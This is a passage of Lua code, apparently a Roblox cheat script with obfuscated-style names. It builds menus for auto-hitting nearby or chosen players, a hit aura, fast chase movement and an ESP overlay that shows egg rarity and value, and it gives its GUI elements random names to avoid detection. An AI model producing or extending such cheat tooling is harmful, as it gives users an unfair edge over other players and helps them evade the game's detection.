
			local picker = tbl248.Picker

			if tbl248.NamesDirty and picker and type(picker.SetOptions) == "function" then
				tbl248.NamesDirty = false
				local tbl253, value401 = func448()
				tbl248.LabelToName = value401
				pcall(picker.SetOptions, picker, tbl253, tbl248.Picked and func449(tbl248.Picked) or tbl253[1], false)
			end
		end)

		local connection4 = Players.PlayerAdded:Connect(function()
			tbl248.NamesDirty = true
		end)

		local connection5 = Players.PlayerRemoving:Connect(function(player)
			tbl248.NamesDirty = true

			if tbl248.Target == player then
				tbl248.Target = nil
			end
		end)

		func4(function()
			for _, item116 in ipairs({ connection2, connection3, connection4, connection5 }) do
				pcall(function()
					item116:Disconnect()
				end)
			end

			tbl248.Target = nil
			func444()
		end)

		local function func450(param233, message2)
			if str1.Toggle(param233, false) and str1.Toggle(str1.InvisibilityHandle, false) then
				str1.UiDefer(function()
					pcall(param233.Set, param233, false, false)
					str1.Notify(message2, "Turn off Invisibility first, both cannot be on at the same time")
				end)

				return true
			end

			return false
		end

		tbl248.Row = obj52:CreateText({ Name = "Hit Status", Text = "Idle" })
		local value402 = obj2:CreateExclusiveGroup({ Name = "Chilli Combat Targets", MaxActive = 1 })

		for i, item117 in ipairs({ "Auto Hit Nearest Player", "Auto Hit Egg Holders", "Auto Hit Specific Player" }) do
			local value403 = nil

			value403 = obj52:CreateToggle({
				Name = item117,
				Default = false,
				Callback = function()
					func450(value403, item117)
				end,
			})

			pcall(value403.JoinExclusiveGroup, value403, value402)
			tbl248.Handles[i] = value403
		end

		local tbl254, value404 = func448()
		tbl248.LabelToName = value404

		tbl248.Picker = obj52:CreateDropdown({
			Name = "Hit Player",
			Options = tbl254,
			Default = tbl254[1],
			SubOf = tbl248.Handles[3],
			Callback = function(value)
				tbl248.Picked = tbl248.LabelToName[tostring(value)]
				tbl248.Target = nil
			end,
		})

		tbl248.AuraHandle = obj52:CreateToggle({
			Name = "Hit Aura",
			Default = false,
			Callback = function()
				func450(tbl248.AuraHandle, "Hit Aura")
			end,
		})

		pcall(tbl248.AuraHandle.JoinExclusiveGroup, tbl248.AuraHandle, value402)
		local value405 = obj52:CreateLabel({ Name = "Chase Settings", Text = "Chase Settings" })

		obj52:CreateSlider({
			Name = "Hit Tween Speed",
			SubOf = value405,
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(value)
				tbl248.Speed = math.clamp(tonumber(value) or 400, 100, 1000)
			end,
		})

		obj52:CreateSlider({
			Name = "Hit Max Speed",
			SubOf = value405,
			Min = 100,
			Max = 1000,
			Default = 750,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(value)
				tbl248.MaxSpeed = math.clamp(tonumber(value) or 750, 100, 1000)
			end,
		})

		obj52:CreateSlider({
			Name = "Hit Lead",
			SubOf = value405,
			Note = "Stand further ahead of the target (+) or closer to them (-)",
			Min = -400,
			Max = 100,
			Default = -275,
			Increment = 1,
			Callback = function(value)
				combat2.SetLead(value)
			end,
		})

		obj52:CreateSlider({
			Name = "Hit Sweep",
			SubOf = value405,
			Note = "How far you move back and forth in front of the target",
			Min = 0,
			Max = 250,
			Default = 60,
			Increment = 1,
			Unit = "%",
			Callback = function(value)
				combat2.SetSweep(value)
			end,
		})

		local n23 = 2
		local value406 = nil

		local function func451()
			local getState = obj2.GetState
			return obj2:GetState("Quick Pinned Features"), getState(obj2, "Quick Pin Groups")
		end

		local function func452()
			local tbl255 = {}

			for _, item118 in ipairs({ tbl248.Handles[1], tbl248.Handles[2], tbl248.AuraHandle }) do
				local ok, result = pcall(function()
					return item118:GetQuickPath()
				end)

				if ok and type(result) == "string" then
					table.insert(tbl255, result)
				end
			end

			return tbl255
		end

		local function func453()
			local obj71, obj72 = func451()
			if not obj71 or not obj72 then
				return false
			end
			local value407 = obj71:Get()
			local tbl256 = obj72:Get()
			if type(value407) ~= "table" or type(tbl256) ~= "table" then
				return false
			end
			local result88 = func452()
			if #result88 == 0 then
				return false
			end

			for _, item119 in ipairs(result88) do
				if not table.find(value407, item119) or tonumber(tbl256[item119]) ~= n23 then
					return false
				end
			end

			return true
		end

		local function func454()
			if value406 and type(value406.SetActionText) == "function" then
				pcall(value406.SetActionText, value406, func453() and "Remove" or "Add")
			end
		end

		local function func455()
			local obj73, obj74 = func451()
			if not obj73 or not obj74 then
				str1.Notify("Quick Bar", "The Quick Bar is not ready yet, try again in a moment")
				return
			end
			local result89 = func453()
			local tbl257 = {}
			local tbl258 = {}
			local value408 = obj73:Get()

			if type(value408) == "table" then
				for i, item120 in ipairs(value408) do
					tbl257[i] = item120
				end
			end

			local value409 = obj74:Get()

			if type(value409) == "table" then
				for k, value410 in pairs(value409) do
					tbl258[k] = value410
				end
			end

			for _, item121 in ipairs(func452()) do
				local foundAt3 = table.find(tbl257, item121)

				if result89 then
					if foundAt3 then
						table.remove(tbl257, foundAt3)
					end

					tbl258[item121] = nil
				else
					tbl258[item121] = n23

					if not foundAt3 then
						table.insert(tbl257, item121)
					end
				end
			end

			obj74:Set(tbl258)
			obj73:Set(tbl257)
			func454()
			str1.Notify("Quick Bar", result89 and "Removed the hit toggles from Quick Bar 2" or "Added the hit toggles to Quick Bar 2")
		end

		value406 = obj52:CreateButton({
			Name = "Add/Remove Hits On Quick Bar 2",
			Note = "Pin or unpin the hit toggles on Quick Bar 2",
			ButtonText = "Add",
			ConfirmText = "Done!",
			Callback = function()
				str1.UiDefer(func455)
			end,
		})

		task.delay(3, function()
			str1.UiDefer(func454)
		end)
	end

	espSection = str1.EspSection

	local function func456(param234, param235)
		local ok, result = pcall(Font.new, param234, param235, Enum.FontStyle.Normal)
		return ok and result or nil
	end

	flag2 = {
		MainFont = func456("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		StatusFont = func456("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular),
		Sequence = function(list49)
			local arr3 = table.create(#list49)

			for i, item122 in ipairs(list49) do
				arr3[i] = ColorSequenceKeypoint.new(item122[1], item122[2])
			end

			return ColorSequence.new(arr3)
		end,
	}

	local color
	color = Color3.fromRGB
	local sequence2
	sequence2 = flag2.Sequence
	local palettes
	palettes = {}

	do
		local gold = {}
		local tbl259 = { 0, color(255, 231, 158) }
		local tbl260 = { 0.4, color(255, 196, 66) }
		local tbl261 = { 1, color(214, 142, 12) }
		local tbl262 = { tbl259, tbl260, tbl261 }
		gold.Text = sequence2(tbl262)
		local tbl263 = { 0, color(122, 76, 0) }
		local tbl264 = { 0.55, color(62, 38, 0) }
		local tbl265 = { 1, color(20, 12, 0) }
		local tbl266 = { tbl263, tbl264, tbl265 }
		gold.Stroke = sequence2(tbl266)
		gold.Outline = color(255, 232, 152)
		palettes.Gold = gold
	end

	do
		local orange = {}
		local tbl267 = { 0, color(255, 198, 132) }
		local tbl268 = { 0.4, color(255, 146, 40) }
		local tbl269 = { 1, color(206, 92, 0) }
		local tbl270 = { tbl267, tbl268, tbl269 }
		orange.Text = sequence2(tbl270)
		local tbl271 = { 0, color(112, 54, 0) }
		local tbl272 = { 0.55, color(56, 27, 0) }
		local tbl273 = { 1, color(18, 8, 0) }
		local tbl274 = { tbl271, tbl272, tbl273 }
		orange.Stroke = sequence2(tbl274)
		orange.Outline = color(255, 194, 112)
		palettes.Orange = orange
	end

	do
		local red = {}
		local tbl275 = { 0, color(255, 105, 105) }
		local tbl276 = { 0.4, color(255, 28, 40) }
		local tbl277 = { 1, color(184, 0, 18) }
		local tbl278 = { tbl275, tbl276, tbl277 }
		red.Text = sequence2(tbl278)
		local tbl279 = { 0, color(124, 0, 15) }
		local tbl280 = { 0.55, color(61, 0, 9) }
		local tbl281 = { 1, color(18, 0, 3) }
		local tbl282 = { tbl279, tbl280, tbl281 }
		red.Stroke = sequence2(tbl282)
		red.Outline = color(255, 128, 138)
		palettes.Red = red
	end

	do
		local accent = {}
		local tbl283 = { 0, color(170, 255, 160) }
		local tbl284 = { 0.45, color(58, 255, 55) }
		local tbl285 = { 1, color(20, 109, 0) }
		local tbl286 = { tbl283, tbl284, tbl285 }
		accent.Text = sequence2(tbl286)
		local tbl287 = { 0, color(10, 52, 6) }
		local tbl288 = { 1, color(3, 16, 0) }
		local tbl289 = { tbl287, tbl288 }
		accent.Stroke = sequence2(tbl289)
		accent.Outline = color(58, 255, 55)
		palettes.Accent = accent
	end

	do
		local sheen = {}
		local tbl290 = { 0, color(255, 255, 255) }
		local tbl291 = { 0.5, color(222, 222, 222) }
		local tbl292 = { 1, color(255, 255, 255) }
		local tbl293 = { tbl290, tbl291, tbl292 }
		sheen.Text = sequence2(tbl293)
		local tbl294 = { 0, color(8, 8, 8) }
		local tbl295 = { 1, color(8, 8, 8) }
		local tbl296 = { tbl294, tbl295 }
		sheen.Stroke = sequence2(tbl296)
		sheen.Outline = color(255, 255, 255)
		palettes.Sheen = sheen
	end

	flag2.Palettes = palettes

	flag2.PaletteFromColor = function(obj75)
		local color2 = Color3.new(1, 1, 1)
		local color3 = Color3.new(0, 0, 0)
		local tbl297 = {}
		local sequence3 = flag2.Sequence
		local tbl298 = { 0, obj75:Lerp(color2, 0.5) }
		local tbl299 = { 0.4, obj75:Lerp(color2, 0.1) }
		local tbl300 = { 1, obj75:Lerp(color3, 0.25) }
		local tbl301 = { tbl298, tbl299, tbl300 }
		tbl297.Text = sequence3(tbl301)
		local sequence4 = flag2.Sequence
		local tbl302 = { 0, obj75:Lerp(color3, 0.55) }
		local tbl303 = { 0.55, obj75:Lerp(color3, 0.75) }
		local tbl304 = { 1, obj75:Lerp(color3, 0.92) }
		local tbl305 = { tbl302, tbl303, tbl304 }
		tbl297.Stroke = sequence4(tbl305)
		tbl297.Outline = obj75:Lerp(color2, 0.25)
		return tbl297
	end

	flag2.SizeScale = 1
	local tbl306 = {}

	flag2.OnSizeChanged = function(param236)
		table.insert(tbl306, param236)
	end

	flag2.SetSizeScale = function(sizeScale)
		if flag2.SizeScale == sizeScale then
			return
		end
		flag2.SizeScale = sizeScale

		for _, item123 in ipairs(tbl306) do
			pcall(item123)
		end
	end

	flag2.RowHeight = function(flag497)
		local currentCamera = workspace.CurrentCamera
		return math.max(6, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.014, 13, 19) * (flag497 or flag2.SizeScale)))
	end

	flag2.ScaledWidth = function(num114, flag498)
		return math.max(30, math.floor(num114 * (flag498 or flag2.SizeScale)))
	end

	flag2.CreateRuntime = function()
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = func3()
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 48
		screenGui.Parent = value1
		return screenGui
	end

	flag2.CreateTag = function(parent, maxDistance)
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = func3()
		billboardGui.AlwaysOnTop = true
		billboardGui.LightInfluence = 0
		billboardGui.MaxDistance = maxDistance
		local frame = Instance.new("Frame")
		frame.Name = func3()
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Size = UDim2.fromScale(1, 1)
		frame.Parent = billboardGui
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.Name = func3()
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Parent = frame
		billboardGui.Parent = parent
		return billboardGui, frame
	end

	flag2.CreateTextRow = function(parent, fontFace, layoutOrder, param237)
		local frame = Instance.new("Frame")
		frame.Name = func3()
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Size = UDim2.fromScale(1, param237)
		frame.LayoutOrder = layoutOrder
		frame.Parent = parent

		local function createTextLabel(zIndex)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = func3()
			textLabel.BackgroundTransparency = 1
			textLabel.Size = UDim2.fromScale(1, 1)
			textLabel.Text = ""
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.ZIndex = zIndex

			if fontFace then
				textLabel.FontFace = fontFace
			else
				textLabel.Font = Enum.Font.GothamBold
			end

			textLabel.Parent = frame
			return textLabel
		end

		local textLabel6 = createTextLabel(2)
		textLabel6.Position = UDim2.fromOffset(1, 1)
		textLabel6.TextColor3 = Color3.new(0, 0, 0)
		textLabel6.TextTransparency = 0.1
		local textLabel7 = createTextLabel(3)
		textLabel7.TextColor3 = Color3.new(1, 1, 1)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Name = func3()
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
		uiStroke.LineJoinMode = Enum.LineJoinMode.Round
		uiStroke.Color = Color3.new(1, 1, 1)
		uiStroke.Transparency = 0.05

		uiStroke.Thickness = pcall(function()
			uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
		end) and 0.05 or 1.2

		uiStroke.Parent = textLabel7
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Name = func3()
		uiGradient.Rotation = 90
		uiGradient.Parent = uiStroke
		local uiGradient2 = Instance.new("UIGradient")
		uiGradient2.Name = func3()
		uiGradient2.Rotation = 90
		uiGradient2.Parent = textLabel7
		return { Holder = frame, Shadow = textLabel6, Label = textLabel7, StrokeGradient = uiGradient, TextGradient = uiGradient2, Palette = nil }
	end

	flag2.SetRow = function(obj, text, palette)
		if obj.Label.Text ~= text then
			obj.Label.Text = text
			obj.Shadow.Text = text
		end

		if obj.Palette ~= palette then
			obj.Palette = palette
			obj.TextGradient.Color = palette.Text
			obj.TextGradient.Rotation = palette.Rotation or 90
			obj.StrokeGradient.Color = palette.Stroke
		end
	end

	flag2.ReadToggle = function(obj, flag499)
		if type(obj) ~= "table" then
			return flag499 == true
		end

		local ok, result = pcall(function()
			local controller = obj._controller
			return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
		end)

		if ok and type(result) == "boolean" then
			return result
		end

		for _, item124 in ipairs({ "Get", "GetValue" }) do
			local ok2, result2 = pcall(function()
				return obj[item124]
			end)

			if ok2 and type(result2) == "function" then
				local ok3, result3 = pcall(result2, obj)
				if ok3 and type(result3) == "boolean" then
					return result3
				end
			end
		end

		return flag499 == true
	end

	flag2.SyncSoon = function(callback24)
		callback24()
		task.delay(0.35, callback24)
	end

	flag2.GetGuardAreas = function()
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		world = world and world:FindFirstChild("Areas")
		return world and world:FindFirstChild("GuardAreas")
	end

	flag2.FindGuardRoot = function(obj)
		local humanoidRootPart = obj:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart and humanoidRootPart:IsA("BasePart") then
			return humanoidRootPart
		end

		if obj.PrimaryPart then
			return obj.PrimaryPart
		end
		return obj:FindFirstChildWhichIsA("BasePart", true)
	end

	flag2.WatchGuards = function(callback25)
		local tbl307 = {}
		local obj76 = flag2.GetGuardAreas()
		if not obj76 then
			return tbl307
		end

		local function func457(child)
			local guard = child:FindFirstChild("Guard")

			if guard and guard:IsA("Model") then
				callback25(child.Name, guard)
			end

			table.insert(tbl307, child.ChildAdded:Connect(function(child2)
				if child2.Name == "Guard" and child2:IsA("Model") then
					callback25(child.Name, child2)
				end
			end))
		end

		for _, child in ipairs(obj76:GetChildren()) do
			func457(child)
		end

		table.insert(tbl307, obj76.ChildAdded:Connect(func457))
		return tbl307
	end

	flag2.DisconnectAll = function(list50)
		for _, item125 in ipairs(list50) do
			pcall(function()
				item125:Disconnect()
			end)
		end

		table.clear(list50)
	end

	n = 18

	tbl3 = {
		"Icon",
		"Name",
		"Rarity",
		"Mutation",
		"Value",
		"Weight",
		"Size",
		"Sell Price",
		"Distance",
		"Area",
		"State",
	}

	tbl4 = { "Icon", "Name", "Value" }
	tbl5 = { "Off", "Rare Only", "All Shown" }
	tbl6 = { Icon = 3.2, Name = 1.35, Rarity = 1.2, Mutation = 1, Value = 1.1, Info = 1 }

	local function func458()
		local ok, result = pcall(Font.new, "rbxassetid://12187365977", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
		return ok and result or flag2.StatusFont
	end

	value3 = func458()
	sequence = flag2.Sequence
	tbl7 = {}

	do
		local tbl308 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl309 = { 0.2, Color3.fromRGB(206, 212, 224) }
		local tbl310 = { 0.42, Color3.fromRGB(74, 80, 94) }
		local tbl311 = { 0.58, Color3.fromRGB(42, 46, 56) }
		local tbl312 = { 0.78, Color3.fromRGB(158, 166, 182) }
		local tbl313 = { 1, Color3.fromRGB(250, 252, 255) }
		tbl7[1] = tbl308
		tbl7[2] = tbl309
		tbl7[3] = tbl310
		tbl7[4] = tbl311
		tbl7[5] = tbl312
		tbl7[6] = tbl313
	end
end

local obj77, obj78, obj79, str39, paint, bold, color, n2, obj80, tbl314
local list51, list52, list53, flag500, n3, func459, func460, func461, func462, func463
local func464, func465

do
	local n4, n5, n6, n7, n8, n9, n10, n11, n12, tweenInfo
	local tweenInfo2, tweenInfo3, tweenInfo4, tweenInfo5, TweenService, color2, func466, tbl315, tbl316

	do
		local value411
		value411 = sequence(tbl7)
		local value412
		value412 = flag2.PaletteFromColor(Color3.fromRGB(77, 255, 122))
		local tbl317
		tbl317 = {}

		do
			local sequence2 = flag2.Sequence
			local tbl318 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl319 = { 0.5, Color3.fromRGB(222, 238, 255) }
			local tbl320 = { 1, Color3.fromRGB(255, 255, 255) }
			local tbl321 = { tbl318, tbl319, tbl320 }
			tbl317.Text = sequence2(tbl321)
		end

		do
			local sequence2 = flag2.Sequence
			local tbl322 = { 0, Color3.fromRGB(8, 8, 8) }
			local tbl323 = { 1, Color3.fromRGB(8, 8, 8) }
			local tbl324 = { tbl322, tbl323 }
			tbl317.Stroke = sequence2(tbl324)
		end

		tbl317.Outline = Color3.fromRGB(255, 255, 255)
		local n13
		n13 = 0.8
		local n14
		n14 = 4.5
		local n15
		n15 = 20
		local n16
		n16 = 0.002
		local tbl325
		tbl325 = { Golden = flag2.Palettes.Gold }

		do
			local silver = {}
			local sequence2 = flag2.Sequence
			local tbl326 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl327 = { 0.45, Color3.fromRGB(214, 222, 232) }
			local tbl328 = { 1, Color3.fromRGB(150, 160, 175) }
			local tbl329 = { tbl326, tbl327, tbl328 }
			silver.Text = sequence2(tbl329)
			local sequence3 = flag2.Sequence
			local tbl330 = { 0, Color3.fromRGB(60, 66, 78) }
			local tbl331 = { 0.55, Color3.fromRGB(30, 33, 40) }
			local tbl332 = { 1, Color3.fromRGB(10, 11, 14) }
			local tbl333 = { tbl330, tbl331, tbl332 }
			silver.Stroke = sequence3(tbl333)
			silver.Outline = Color3.fromRGB(214, 222, 232)
			tbl325.Silver = silver
		end

		tbl325.Sakura = flag2.PaletteFromColor(Color3.fromRGB(255, 158, 216))
		tbl325.GreatBloom = flag2.PaletteFromColor(Color3.fromRGB(124, 255, 196))
		tbl325.Boss = flag2.PaletteFromColor(Color3.fromRGB(255, 122, 122))
		tbl325.Monstrous = flag2.PaletteFromColor(Color3.fromRGB(192, 139, 255))

		do
			local rainbow = {}
			local sequence2 = flag2.Sequence
			local tbl334 = { 0, Color3.fromRGB(255, 107, 107) }
			local tbl335 = { 0.2, Color3.fromRGB(255, 179, 107) }
			local tbl336 = { 0.4, Color3.fromRGB(255, 240, 107) }
			local tbl337 = { 0.6, Color3.fromRGB(107, 255, 138) }
			local tbl338 = { 0.8, Color3.fromRGB(107, 200, 255) }
			local tbl339 = { 1, Color3.fromRGB(185, 107, 255) }
			local tbl340 = { tbl334, tbl335, tbl336, tbl337, tbl338, tbl339 }
			rainbow.Text = sequence2(tbl340)
			local sequence3 = flag2.Sequence
			local tbl341 = { 0, Color3.fromRGB(20, 20, 30) }
			local tbl342 = { 1, Color3.fromRGB(8, 8, 12) }
			local tbl343 = { tbl341, tbl342 }
			rainbow.Stroke = sequence3(tbl343)
			rainbow.Outline = Color3.fromRGB(255, 255, 255)
			rainbow.Rotation = 0
			tbl325.Rainbow = rainbow
		end

		local value413
		value413 = flag2.PaletteFromColor(Color3.fromRGB(143, 227, 255))
		local rfEggWorldAskFieldEggSnapshot
		rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
		local n17
		n17 = 0
		local num115

		num115 = {
			Eggs = false,
			MinRarity = 5,
			Specific = {},
			MutationSet = {},
			AnyMutation = false,
			NoMutation = false,
			Info = {},
			Highlight = tbl5[1],
			MinValue = 0,
			HighlightMin = 6,
			MaxDistance = math.huge,
			SizeScale = 0.75,
			FixedSize = false,
			OwnBase = true,
		}

		for _, item126 in ipairs(tbl4) do
			num115.Info[item126] = true
		end

		local tbl344
		tbl344 = {}
		local tbl345, flag501, flag502, n18, n19, flag503, flag504, n20, func467
		local tbl346 = {}
		tbl345 = {}
		flag501 = nil
		flag502 = false
		n18 = 0
		n19 = 0
		flag503 = false
		flag504 = nil
		n20 = 0

		func467 = function(param238)
			local entry22 = tbl346[param238]
			if entry22 then
				return entry22
			end
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local flag505 = type(directory) == "table" and directory[param238]
			local rarity = type(flag505) == "table" and type(flag505.Rarity) == "table" and flag505.Rarity or nil
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.new(1, 1, 1)
			local paletteFromCol = flag2.PaletteFromColor(color3)
			local rarityGradient = rarity and rarity.RarityGradient

			if rarity and typeof(rarityGradient) ~= "Instance" then
				rarityGradient = ReplicatedStorage:FindFirstChild("Assets")
				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("UI")
				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradients")

				if rarityGradient then
					rarityGradient = rarityGradient:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			if typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient") then
				paletteFromCol.Text = rarityGradient.Color
				paletteFromCol.Rotation = rarityGradient.Rotation
			end

			local flag506

			if rarity then
				flag506 = tostring(rarity.DisplayName or rarity._id or "")
			else
				flag506 = rarity
			end

			local name = flag506 or ""
			local rarityPalette

			if string.upper(name) ~= "SECRET" then
				rarityPalette = paletteFromCol
			else
				rarityPalette = { Text = value411, Stroke = paletteFromCol.Stroke, Outline = paletteFromCol.Outline, Rotation = 90 }
			end

			local tbl347 = {}

			if rarity then
				rarity = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			tbl347.Number = rarity or 0
			tbl347.Name = name
			tbl347.Color = color3
			tbl347.Palette = paletteFromCol
			tbl347.RarityPalette = rarityPalette
			local displayName = type(flag505) == "table"

			if displayName then
				displayName = tostring(flag505.DisplayName or param238)
			end

			tbl347.DisplayName = displayName or tostring(param238)
			tbl347.Icon = type(flag505) == "table" and flag505.Icon or nil
			tbl347.EarningRate = type(flag505) == "table" and tonumber(flag505.EarningRate) or 0
			tbl346[param238] = tbl347
			return tbl347
		end

		local func468, func469, func470, func471, tbl348, func472

		do
			local function func473(childName16)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(childName16)
				if areaEggSlotsClient and areaEggSlotsClient:IsA("Model") then
					local hitbox = areaEggSlotsClient:FindFirstChild("Hitbox")
					return areaEggSlotsClient, hitbox and hitbox:IsA("BasePart") and hitbox or nil
				end
				return nil, nil
			end

			func468 = function()
				if not flag504 or not flag504.Parent then
					flag504 = flag2.CreateRuntime()
				end
			end

			local function func474(param239)
				local n21 = tonumber(param239) or 0
				local tbl349 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n22 = 1

				while math.abs(n21) >= 1000 and n22 < #tbl349 do
					n21 /= 1000
					n22 += 1
				end

				return string.format(n22 == 1 and "%.0f%s" or "%.2f%s", n21, tbl349[n22])
			end

			local function func475(num116)
				local currentCamera = workspace.CurrentCamera
				if not currentCamera then
					return num115.MaxDistance
				end
				return math.min(num115.MaxDistance, num116 * currentCamera.ViewportSize.Y / 2 * n15 * math.tan(math.rad(currentCamera.FieldOfView) * 0.5))
			end

			local function func476(param240)
				local tbl350 = {
					{ param240.IconHolder, tbl6.Icon, param240.ShowIcon },
					{ param240.NameRow.Holder, tbl6.Name, param240.ShowName },
					{ param240.RarityRow.Holder, tbl6.Rarity, param240.ShowRarity },
					{ param240.MutationRow.Holder, tbl6.Mutation, param240.ShowMutation },
					{ param240.ValueRow.Holder, tbl6.Value, param240.ShowValue },
					{ param240.ExtraRow.Holder, tbl6.Info, param240.ShowExtra },
				}

				local value414, value415, value416 = ipairs(tbl350)
				local n21 = 0

				for _, value417 in value414, value415, value416 do
					if value417[3] then
						n21 += value417[2]
					end
				end

				local n22 = math.max(n21, 1)

				for _, item127 in ipairs(tbl350) do
					item127[1].Visible = item127[3]
					item127[1].Size = UDim2.fromScale(1, item127[3] and item127[2] / n22 or 0)
				end

				local num117 = flag2.ScaledWidth(120, num115.SizeScale)
				local height = math.max(1, math.floor(flag2.RowHeight(num115.SizeScale) * n22))

				if param240.Width ~= num117 or param240.Height ~= height or param240.Fixed ~= num115.FixedSize then
					param240.Width = num117
					param240.Height = height
					param240.Fixed = num115.FixedSize

					if num115.FixedSize then
						local n23 = n14 * num115.SizeScale
						param240.Billboard.Size = UDim2.fromScale(n23, n23 * height / num117)
						param240.Billboard.MaxDistance = func475(n23)
					else
						param240.Billboard.Size = UDim2.fromOffset(num117, height)
						param240.Billboard.MaxDistance = num115.MaxDistance
					end
				end
			end

			func469 = function(param241)
				param241.Width = nil
				func476(param241)
			end

			local function func477()
				local value418, value419 = flag2.CreateTag(flag504, num115.MaxDistance)
				local frame = Instance.new("Frame")
				frame.Name = func3()
				frame.BackgroundTransparency = 1
				frame.BorderSizePixel = 0
				frame.LayoutOrder = 0
				frame.Parent = value419
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = func3()
				imageLabel.AnchorPoint = Vector2.new(0.5, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.Position = UDim2.fromScale(0.5, 1)
				imageLabel.Size = UDim2.fromScale(1, 1)
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.Parent = frame
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = func3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
				uiAspectRatioConstraint.Parent = imageLabel

				local tbl351 = {
					Billboard = value418,
					IconHolder = frame,
					Icon = imageLabel,
					NameRow = flag2.CreateTextRow(value419, flag2.MainFont, 1, 0.4),
					RarityRow = flag2.CreateTextRow(value419, value3, 2, 0.2),
					MutationRow = flag2.CreateTextRow(value419, flag2.MainFont, 3, 0.2),
					ValueRow = flag2.CreateTextRow(value419, flag2.MainFont, 4, 0.2),
					ExtraRow = flag2.CreateTextRow(value419, flag2.MainFont, 5, 0.2),
					Highlight = nil,
					Anchor = nil,
					CFrame = nil,
					Width = nil,
					Height = nil,
					ShowIcon = false,
					ShowName = true,
					ShowRarity = false,
					ShowMutation = false,
					ShowValue = false,
					ShowExtra = false,
				}

				func476(tbl351)
				return tbl351
			end

			local function func478(param242)
				if param242.Highlight then
					param242.Highlight:Destroy()
					param242.Highlight = nil
					n20 -= 1
				end
			end

			local function func479(param243, param244)
				local n21 = tonumber(param243.AssetScale) or 1
				local n22 = n21 > 5 and (n21 / 5) ^ 1.2 * 19.637875755794113 or n21 ^ 1.85
				local mutations = tbl1.Mutations
				local flag507 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n23 = 1

				if flag507 then
					local ok
					ok, n23 = pcall(mutations.EarningsFor, type(param243.Mutations) == "table" and param243.Mutations or {})
					ok = ok and type(n23) == "number"
					local n24 = 1

					if not ok then
						n23 = n24
					end
				end

				return param244.EarningRate * n22 * n23
			end

			local function func480()
				local list54 = {}
				local eggState = tbl1.EggState
				local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
				if not placedEggRenders or type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return list54
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return list54
				end
				local userId4 = tostring(localPlayer.UserId)
				local list55 = {}

				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, userId4, 1, true) then
						list55[#list55 + 1] = child
					end
				end

				for k, value420 in pairs(result) do
					if type(value420) == "table" and value420.Placement ~= nil and type(value420.AssetCategory) == "string" then
						local base = tostring(k)
						local value421 = nil

						for _, item128 in ipairs(list55) do
							if item128.Name == base or string.find(item128.Name, base, 1, true) or item128:GetAttribute("Uid") == base then
								value421 = item128
								break
							end
						end

						if value421 then
							local ok2, result2 = pcall(function()
								return value421:IsA("Model") and value421:GetPivot() or value421.CFrame
							end)

							local mutations = type(value420.Mutations) == "table" and value420.Mutations or {}

							list54[#list54 + 1] = {
								Uid = "base:" .. base,
								AssetCategory = value420.AssetCategory,
								AssetScale = value420.AssetScale,
								Mutations = mutations,
								BaseMutation = value420.BaseMutation or mutations[1],
								State = "Base",
								AreaId = "Your Base",
								BottomCFrame = ok2 and result2 or nil,
								Model = value421,
							}
						end
					end
				end

				return list54
			end

